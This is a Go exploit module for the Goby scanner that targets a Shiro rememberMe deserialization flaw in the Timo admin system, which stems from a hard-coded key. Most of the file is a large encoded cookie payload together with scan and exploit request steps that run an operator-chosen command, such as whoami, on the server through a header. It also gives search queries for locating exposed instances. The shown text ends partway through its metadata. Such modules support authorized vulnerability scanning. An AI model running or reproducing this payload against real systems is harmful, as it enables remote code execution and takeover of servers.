package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "timo shiro rememberme rce",
    "Description": "<p>Timo is a background management system based on SpringBoot.</p><p>Timo v2.0 and earlier versions have a security vulnerability, which stems from the existence of hard coded shiro-key in the software, which can be used by attackers to execute arbitrary code.</p>",
    "Product": "Timo",
    "Homepage": "https://gitee.com/aun/Timo",
    "DisclosureDate": "2022-06-19",
    "Author": "蜡笔小新",
    "FofaQuery": "title=\"Timo登录\" || body=\"TIMO后台管理系统\"",
    "GobyQuery": "title=\"Timo登录\" || body=\"TIMO后台管理系统\"",
    "Level": "3",
    "Impact": "<p>Attackers can use this vulnerability to arbitrarily execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://gitee.com/aun/Timo\">https://gitee.com/aun/Timo</a></p><p><a href=\"https://gitee.com/mingSoft/MCMS\"></a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "command",
            "type": "input",
            "value": "whoami",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/login",
                "follow_redirect": false,
                "header": {
                    "Cookie": "rememberMe=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",
                    "testcmd": "echo 3373c81c685536ee89ebcb4369d95c5f",
                    "testecho": "3373c81c685536ee89ebcb4369d95c5f"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "3373c81c685536ee89ebcb4369d95c5f",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "3373c81c685536ee89ebcb4369d95c5f",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "not contains",
                        "value": "rememberMe=deleteMe",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/login",
                "follow_redirect": false,
                "header": {
                    "Cookie": "rememberMe=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",
                    "testecho": "3373c81c685536ee89ebcb4369d95c5f",
                    "testcmd": "{{{command}}}"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "not contains",
                        "value": "rememberMe=deleteMe",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$head",
                        "operation": "contains",
                        "value": "3373c81c685536ee89ebcb4369d95c5f",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|regex|(.*)"
            ]
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "timo shiro rememberme 反序列化漏洞",
            "Product": "Timo",
            "Description": "<p>Timo 是一个基于 SpringBoot 开发的后台管理系统。</p><p>Timo v2.0及之前的版本存在安全漏洞，该漏洞源于软件存在硬编码的 shiro-key，攻击者可利用该key并执行任意代码。</p>",
            "Recommendation": "<p>1、官方暂未修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://gitee.com/aun/Timo\">https://gitee.com/aun/Timo</a><a href=\"https://gitee.com/mingSoft/MCMS\"></a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "timo shiro rememberme rce",
            "Product": "Timo",
